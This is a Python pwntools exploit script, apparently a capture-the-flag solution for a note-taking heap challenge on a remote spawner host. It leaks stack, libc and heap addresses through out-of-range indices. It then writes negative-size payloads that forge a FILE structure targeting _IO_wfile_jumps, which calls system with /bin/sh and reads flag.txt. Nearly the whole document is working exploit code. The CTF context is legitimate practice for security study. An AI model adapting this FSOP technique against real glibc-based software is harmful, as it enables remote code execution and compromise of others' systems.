#!/usr/bin/env python3

from pwn import *

# ENV
PORT = 33400
HOST = "spawner.cscv.vn"
exe = context.binary = ELF('./chall_patched', checksec=False)
libc = ELF('./libc.so.6', checksec=False)
ld = ELF('./ld-2.39.so', checksec=False)

def GDB():
    if not args.r:
        gdb.attach(p, gdbscript='''
            source /home/nhh/pwndbg/gdbinit.py
            # add
            brva 0x00000000000014C9
            # brva 0x0000000000001335

            # show_note
            brva 0x00000000000015A8

            # show_file
            brva 0x0000000000001662
            b* _IO_wfile_overflow
            b* _IO_wdoallocbuf+45
            c
            set follow-fork-mode parent
            ''')

if len(sys.argv) > 1 and sys.argv[1] == 'r':
    p = remote(HOST, PORT)
else:
    p = exe.process()

def add(idx, size, data = b'abcd'):
    p.sendlineafter(b'choice: ', str(1))
    p.sendlineafter(b'Index: ', str(idx))
    p.sendlineafter(b'Size: ', str(size))
    p.sendlineafter(b'message: ', data)

def show_note(idx):
    p.sendlineafter(b'choice: ', str(2))
    p.sendlineafter(b'Index: ', str(idx))

def show_file(idx):
    p.sendlineafter(b'choice: ', str(3))
    p.sendlineafter(b'Index: ', str(idx))

# VARIABLE


# PAYLOAD
add(0, 0x20)
show_note(0)
p.recv(8)
stack_leak = u64(p.recv(8))
log.info("Stack leak: " + hex(stack_leak))
canary_addr = stack_leak - 0x160

show_note(18)
p.recvuntil(b'Invalid index\n')
p.recv(0x18)
libc_leak = u64(p.recv(8))
libc.address = libc_leak - 0x2044e0
log.info("Libc base: " + hex(libc.address))
system = libc.sym.system
io_wfile_jumps = libc.sym._IO_wfile_jumps

show_note(19)
p.recvuntil(b'Invalid index\n')
p.recv(0x18)
heap_leak = u64(p.recv(8))
heap_base = heap_leak - 0x570
log.info("Heap base: " + hex(heap_base))

payload = p64(0) + p64(0x1e1) + b'  /bin/sh'
payload = payload.ljust(0x20, b'\0')
payload += p64(15)
add(15, -0x80000000, payload)

payload = p16(0) + p8(1)
payload = payload.ljust(0x18, b'\0')
payload += p64(heap_leak)
payload += p64(0x13)
add(15, -0x80000000, payload)

payload = p64(0) + p64(io_wfile_jumps - 0x20)
payload = payload.ljust(0x20, b'\0')
payload += p64(0x16)
add(15, -0x80000000, payload)

payload = p64(heap_base + 0x490 - 0x10) + p64(0) + p64(heap_base + 0x4a0)
payload = payload.ljust(0x20, b'\0')
payload += p64(0x14)
add(15, -0x80000000, payload)

payload = p64(heap_base + 0x490)
payload = payload.ljust(0x20, b'\0')
payload += p64(0x17)
add(15, -0x80000000, payload)

payload = p64(0)*3 + p64(system)
payload += p64(0x12)
add(15, -0x80000000, payload)

show_file(15)

p.sendline(b'cat flag.txt')

p.interactive()